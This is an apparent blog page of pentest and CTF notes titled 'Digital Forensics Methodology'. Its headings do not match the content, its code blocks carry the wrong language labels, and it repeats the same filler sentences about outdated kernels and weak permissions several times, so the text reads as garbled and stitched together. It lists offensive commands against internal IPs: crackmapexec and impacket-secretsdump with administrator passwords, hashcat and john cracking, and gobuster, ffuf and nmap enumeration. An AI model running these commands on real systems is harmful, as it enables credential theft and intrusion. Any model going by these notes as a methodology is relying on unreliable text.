---
TitleSEO: "Digital Forensics Methodology | ZureFX"
TitlePost: "Digital Forensics Methodology"
Author: "ZureFX"
Description: "Personal notes on Digital Forensics Methodology. Quick reference for pentesting and CTF challenges."
Keywords: "privilege escalation, enumeration, blue team"
URL: "https://zurefx.github.io/notes/note-digital-forensics-methodology-936.html"
URL_IMAGES: ""
Date: "2024-07-20"
Tags: "Privilege Escalation, Enumeration, Blue Team"
Section: "notes"
Lang: "en"
main_img: "note-digital-forensics-methodology-936"
Permalink: "/notes/note-digital-forensics-methodology-936.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Python

### C#

Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible.

> **Note:** Constrained Delegation was identified as the primary attack vector in this scenario.

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit.

```python
crackmapexec smb 10.13.195.77 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.60.240.145/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.31.184.201/FUZZ
```

## psexec

### ffuf

The kernel version was outdated and vulnerable to a publicly known exploit. Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit. Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
nmap -sCV -p8888,445,143 10.37.128.246 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.72.41.183/FUZZ
```

## Bash

### gobuster

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.51.74.88/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.60.134.11/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files. Initial enumeration revealed several interesting open ports on the target.

```bash
crackmapexec smb 10.101.78.79 -u administrator -p 'P@ssw0rd!' --shares
```

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.116.195.132
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.64.199.183/FUZZ
```

## NFS

### dcomexec

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files.

```bash
crackmapexec smb 10.58.172.77 -u administrator -p 'P@ssw0rd!' --shares
```

> **Note:** NTLM Relay was identified as the primary attack vector in this scenario.

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.127.128.216
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.118.96.187/FUZZ
gobuster dir -u http://10.96.130.43/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## mimikatz

### enum4linux

- `smbclient`
- `john`
- `bloodhound`
- `pwncat`
- `crackmapexec`

- `CSRF`
- `Constrained Delegation`
- `netcat`
- `Unconstrained Delegation`

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.78.33.11
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.45.149.234/FUZZ
```
